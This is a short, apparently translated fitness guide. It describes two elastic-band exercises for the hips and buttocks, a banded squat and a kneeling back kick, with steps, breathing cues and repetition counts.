#Action 1: squat with elastic circle
Function: promote hip shaping

As shown in the figure, lay the yoga mat, extend the leg into the elastic ring, and open the leg as wide as the hip. Here, you need to pay attention to the position of the elastic ring in the middle of your legs, then raise your arms forward and cross your fingers. Then inhale, bend your knees and squat slowly. Then exhale and slowly straighten your knees back to their original position** 10 times per group, 2-3 groups per day**

#Action 2: kick after kneeling with elastic circle
Function: shaping buttocks

As shown in the figure, put the elastic ring into the legs and pull it to the upper part of the thigh. The whole person is in a kneeling position, face down, and then support the yoga mat with both hands. Then start kicking, use the strength of the hip to make the leg kick back to the limit, and then slowly retract. Remember not to touch the mat when retracting, and then repeat** Do 15 times on the left and right sides, repeat 2-3 groups**
